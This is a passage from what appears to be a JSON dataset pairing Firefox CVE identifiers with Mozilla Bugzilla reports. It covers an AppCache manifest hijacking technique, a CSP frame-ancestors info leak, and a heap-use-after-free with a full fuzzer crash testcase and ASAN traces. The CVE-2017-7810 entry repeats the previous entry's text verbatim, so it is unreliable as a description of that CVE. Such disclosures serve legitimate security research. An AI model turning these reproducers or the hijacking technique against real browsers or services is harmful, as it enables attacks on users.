        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3142.0 Safari/537.36 Steps to reproduce: It seems like the specification of how App Cache is working is a lot less restrictive compared to Service Workers. The following scenarios are possible using an App-Cache manifest in Firefox: 1. a file below a path (u/XYZ) can set FALLBACK for the complete origin 2. an SVG-file can set a manifest (even if mime is image/svg+xml) 3. an XML can set manifest (using xmlns=xhtml) 4. a manifest can be served on any content-type (spec says must be text/application-cache) This currently affects a bunch of file serving services which uses sandboxed origins (exampleusercontent.com) but still serve inline content on the sandboxed domains. By triggering a cookie-bomb combined with a manifest, you're able to hijack any URL on the sandboxed domain using FALLBACK independently if the files are served from a sub-path on the domain. Manifest should (probably) not be possible to set from a subfolder onto the complete origin (this will probably break a bunch of apps tho) Setting a manifest should probably be restricted to text/html only. I've set up a test environment at http://avlidienbrunn.se/appcache/tests.html, see attached for full source code and results from other browsers. FYI: Chrome fixes: 1: Temporary fix by requiring Content-Type \"text/application-cache\" for setting FALLBACK outside of the current path, due to breaking existing apps. Currently tracked as 422987. 2: Chose not to fix 3: Chose not to fix 4: Chose not to fix (except in case #1) Actual results: 1. Manifest was loaded 2. Manifest was loaded 3. Manifest was loaded 4. Manifest was loaded Expected results: 1. Manifest was not loaded 2. Manifest was not loaded 3. Manifest was not loaded 4. Manifest was not loaded"
      }
    ],
    "CVE-2017-7808": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1367531",
        "title": "CSP frame-ancestors should not compare paths per CSP-3",
        "description": "+++ This bug was initially created as a clone of Bug #1364859 +++ See bug 1364859 comment 5 and bug 1364859 comment 9: Firefox accepts origins with paths in frame-ancestors and compares against those paths. This is actually correct according to CSP-2 if you follow the definitions of host-source, but I don't think that was intentional: frame-ancestors was intended to be a \"better X-Frame-Options\" which operates only on origins. This creates a cross-origin info leak, though, and in the latest CSP spec frame-ancestors is explicitly defined as being only origin-based"
      }
    ],
    "CVE-2017-7809": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1380284",
        "title": "heap-use-after-free in mozilla::a11y::DocAccessible::RelocateARIAOwnedIfNeeded",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170711160010). <script> function start() { fuzzPriv.enableAccessibility(); o1=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o2=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o4=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o5=window.document; o6=document.documentElement; document.documentElement.parentNode.removeChild(o6); o1.appendChild(o2); o22=window.getSelection(); o38=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o2.appendChild(o38); try{o5.designMode='on';}catch(e){} o4.style.position='absolute'; o5.write('<html><body><div></div><div></div></body></html>'); o4.prepend(o1,undefined); o106=document.createElementNS('http://www.w3.org/1999/xhtml','tr'); window.top.document.documentElement.appendChild(o4); o22.selectAllChildren(o38); window.top.document.documentElement.appendChild(o106); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); location.reload(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==16173==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d00005917c at pc 0x7f323e0d3825 bp 0x7fff23077f90 sp 0x7fff23077f88 READ of size 4 at 0x60d00005917c thread T0 (Web Content) #0 0x7f323e0d3824 in GetBoolFlag /home/worker/workspace/build/src/dom/base/nsINode.h:1592:12 #1 0x7f323e0d3824 in HasID /home/worker/workspace/build/src/dom/base/nsINode.h:1601 #2 0x7f323e0d3824 in mozilla::a11y::DocAccessible::RelocateARIAOwnedIfNeeded(nsIContent*) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2043 #3 0x7f323e069e30 in mozilla::a11y::TreeWalker::AccessibleFor(nsIContent*, unsigned int, bool*) /home/worker/workspace/build/src/accessible/base/TreeWalker.cpp:321:15 #4 0x7f323e06a317 in mozilla::a11y::TreeWalker::Next() /home/worker/workspace/build/src/accessible/base/TreeWalker.cpp:175:27 #5 0x7f323e0dcd07 in mozilla::a11y::DocAccessible::CacheChildrenInSubtree(mozilla::a11y::Accessible*, mozilla::a11y::Accessible**) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2293:39 #6 0x7f323e0dc1cf in mozilla::a11y::DocAccessible::DoInitialUpdate() /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:1516:3 #7 0x7f323e04aa76 in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:627:16 #8 0x7f323ae61f77 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1854:12 #9 0x7f323ae71855 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:298:7 #10 0x7f323ae71524 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:320:5 #11 0x7f323ae73bbb in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:761:5 #12 0x7f323ae73bbb in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:674 #13 0x7f323ae737c5 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:575:9 #14 0x7f323b6a53e2 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:67:16 #15 0x7f32355123c1 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #16 0x7f32350e3f2f in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1608:28 #17 0x7f323503018e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2093:25 #18 0x7f323502d2d4 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2019:17 #19 0x7f323502ebb4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1888:5 #20 0x7f323502f198 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1921:15 #21 0x7f323421f875 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1437:14 #22 0x7f3234225aa8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:489:10 #23 0x7f3235037e41 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #24 0x7f3234f940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #25 0x7f3234f940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #26 0x7f3234f940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #27 0x7f323a7c237f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #28 0x7f323ea50817 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:895:22 #29 0x7f3234f940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #30 0x7f3234f940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #31 0x7f3234f940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #32 0x7f323ea5027d in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:711:34 #33 0x4eb813 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #34 0x4eb813 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #35 0x7f325165e82f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291 #36 0x41d168 in _start (/home/nils/fuzzer3/firefox/firefox+0x41d168) 0x60d00005917c is located 28 bytes inside of 136-byte region [0x60d000059160,0x60d0000591e8) freed by thread T0 (Web Content) here: #0 0x4bb69b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f32340bbc47 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2661:25 #2 0x7f32340c2e0b in FreeSnowWhite /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2849:3 #3 0x7f32340c2e0b in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3851 #4 0x7f32340c2323 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3672:9 #5 0x7f32340c6100 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4209:21 #6 0x7f3236f9337d in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1676:3 #7 0x7f3236ae145b in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1409:3 #8 0x7f323423ee21 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:129 #9 0x7f3235b22fe0 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1996:12 #10 0x7f3235b22fe0 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1315 #11 0x7f3235b22fe0 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1282 #12 0x7f3235b2a05f in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:967:12 #13 0x7f323ef1d164 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #14 0x7f323ef1d164 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #15 0x7f323ef05f8b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #16 0x7f323ef05f8b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #17 0x7f323eeecd08 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #18 0x7f323ef1d2fc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #19 0x7f323ef1dc52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #20 0x7f323f894243 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2889:12 #21 0x7f3235a44a1b in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #22 0x7f323ef1d164 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #23 0x7f323ef1d164 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #24 0x7f323ef05f8b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #25 0x7f323ef05f8b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #26 0x7f323eeecd08 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #27 0x7f323ef1d2fc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #28 0x7f323ef1dc52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #29 0x7f323f8960cb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12 #30 0x7f323837d2b5 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #31 0x7f3238d342b5 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #32 0x7f3238d342b5 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #33 0x7f3238cfc219 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1141:51 #34 0x7f3238cfe2a4 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1311:20 #35 0x7f3238cddfa1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:464:16 #36 0x7f3238ce1472 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:824:9 #37 0x7f323afc4e6f in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1104:7 previously allocated by thread T0 (Web Content) here: #0 0x4bb9ec in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ecf0d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f3239075493 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f3239075493 in NS_NewHTMLSpanElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/html/HTMLSpanElement.cpp:15 #4 0x7f32390fda92 in CreateHTMLElement /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:287:41 #5 0x7f32390fda92 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString const*) /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:258 #6 0x7f3236fc48c3 in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString const*) /home/worker/workspace/build/src/dom/base/nsNameSpaceManager.cpp:183:12 #7 0x7f3236eb23bb in nsDocument::CreateElem(nsAString const&, nsIAtom*, int, nsAString const*) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8463:17 #8 0x7f323a8e6531 in mozilla::EditorBase::CreateHTMLContent(nsIAtom*) /home/worker/workspace/build/src/editor/libeditor/EditorBase.cpp:4720:15 #9 0x7f323a945bb8 in mozilla::HTMLEditor::CreateAnonymousElement(nsIAtom*, nsIDOMNode*, nsAString const&, bool) /home/worker/workspace/build/src/editor/libeditor/HTMLAnonymousNodeEditor.cpp:191:32 #10 0x7f323aa25f1c in CreateResizingInfo /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:210:5 #11 0x7f323aa25f1c in mozilla::HTMLEditor::ShowResizersInner(nsIDOMElement*) /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:350 #12 0x7f323a9480ee in ShowResizers /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:283:17 #13 0x7f323a9480ee in mozilla::HTMLEditor::CheckSelectionStateForAnonymousButtons(nsISelection*) /home/worker/workspace/build/src/editor/libeditor/HTMLAnonymousNodeEditor.cpp:455 #14 0x7f323aa2185f in mozilla::ResizerSelectionListener::NotifySelectionChanged(nsIDOMDocument*, nsISelection*, short) /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:93:19 #15 0x7f3236d40356 in mozilla::dom::Selection::NotifySelectionListeners() /home/worker/workspace/build/src/dom/base/Selection.cpp:3764:15 #16 0x7f323b1ddfc0 in NotifySelectionListeners /home/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp:2069:23 #17 0x7f323b1ddfc0 in nsFrameSelection::EndBatchChanges(short) /home/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp:2057 #18 0x7f3236d40b56 in mozilla::dom::Selection::EndBatchChangesInternal(short) /home/worker/workspace/build/src/dom/base/Selection.cpp:3792:21 #19 0x7f3236d3bf1b in ~SelectionBatcher /home/worker/workspace/build/src/dom/base/Selection.h:484:19 #20 0x7f3236d3bf1b in mozilla::dom::Selection::SelectAllChildren(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/Selection.cpp:3186 #21 0x7f3236d3c074 in mozilla::dom::Selection::SelectAllChildrenJS(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/Selection.cpp:3169:3 #22 0x7f3237b86365 in mozilla::dom::SelectionBinding::selectAllChildren(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Selection*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/SelectionBinding.cpp:719:9 #23 0x7f32389358a0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3060:13 #24 0x7f323ef1d164 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #25 0x7f323ef1d164 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #26 0x7f323ef05f8b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #27 0x7f323ef05f8b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #28 0x7f323eeecd08 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #29 0x7f323ef1d2fc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #30 0x7f323ef1dc52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #31 0x7f323f8960cb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12 #32 0x7f323837d2b5 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #33 0x7f3238d342b5 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #34 0x7f3238d342b5 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #35 0x7f3238cfc219 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1141:51 #36 0x7f3238cfe2a4 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1311:20 #37 0x7f3238cddfa1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:464:16 #38 0x7f3238ce1472 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:824:9 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/base/nsINode.h:1592:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c1a800031d0: 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fd fd 0x0c1a800031e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1a800031f0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c1a80003200: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c1a80003210: fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c1a80003220: 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd[fd] 0x0c1a80003230: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c1a80003240: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 0x0c1a80003250: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa 0x0c1a80003260: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a80003270: fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==16173==ABORTING"
      }
    ],
    "CVE-2017-7810": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1386787%2C1389974%2C1371657%2C1360334%2C1390550%2C1380824%2C1387918%2C1395598",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170711160010). <script> function start() { fuzzPriv.enableAccessibility(); o1=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o2=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o4=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o5=window.document; o6=document.documentElement; document.documentElement.parentNode.removeChild(o6); o1.appendChild(o2); o22=window.getSelection(); o38=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o2.appendChild(o38); try{o5.designMode='on';}catch(e){} o4.style.position='absolute'; o5.write('<html><body><div></div><div></div></body></html>'); o4.prepend(o1,undefined); o106=document.createElementNS('http://www.w3.org/1999/xhtml','tr'); window.top.document.documentElement.appendChild(o4); o22.selectAllChildren(o38); window.top.document.documentElement.appendChild(o106); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); location.reload(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==16173==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d00005917c at pc 0x7f323e0d3825 bp 0x7fff23077f90 sp 0x7fff23077f88 READ of size 4 at 0x60d00005917c thread T0 (Web Content) #0 0x7f323e0d3824 in GetBoolFlag /home/worker/workspace/build/src/dom/base/nsINode.h:1592:12 #1 0x7f323e0d3824 in HasID /home/worker/workspace/build/src/dom/base/nsINode.h:1601 #2 0x7f323e0d3824 in mozilla::a11y::DocAccessible::RelocateARIAOwnedIfNeeded(nsIContent*) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2043 #3 0x7f323e069e30 in mozilla::a11y::TreeWalker::AccessibleFor(nsIContent*, unsigned int, bool*) /home/worker/workspace/build/src/accessible/base/TreeWalker.cpp:321:15 #4 0x7f323e06a317 in mozilla::a11y::TreeWalker::Next() /home/worker/workspace/build/src/accessible/base/TreeWalker.cpp:175:27 #5 0x7f323e0dcd07 in mozilla::a11y::DocAccessible::CacheChildrenInSubtree(mozilla::a11y::Accessible*, mozilla::a11y::Accessible**) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2293:39 #6 0x7f323e0dc1cf in mozilla::a11y::DocAccessible::DoInitialUpdate() /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:1516:3 #7 0x7f323e04aa76 in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:627:16 #8 0x7f323ae61f77 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1854:12 #9 0x7f323ae71855 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:298:7 #10 0x7f323ae71524 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:320:5 #11 0x7f323ae73bbb in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:761:5 #12 0x7f323ae73bbb in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:674 #13 0x7f323ae737c5 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:575:9 #14 0x7f323b6a53e2 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:67:16 #15 0x7f32355123c1 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #16 0x7f32350e3f2f in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1608:28 #17 0x7f323503018e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2093:25 #18 0x7f323502d2d4 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2019:17 #19 0x7f323502ebb4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1888:5 #20 0x7f323502f198 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1921:15 #21 0x7f323421f875 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1437:14 #22 0x7f3234225aa8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:489:10 #23 0x7f3235037e41 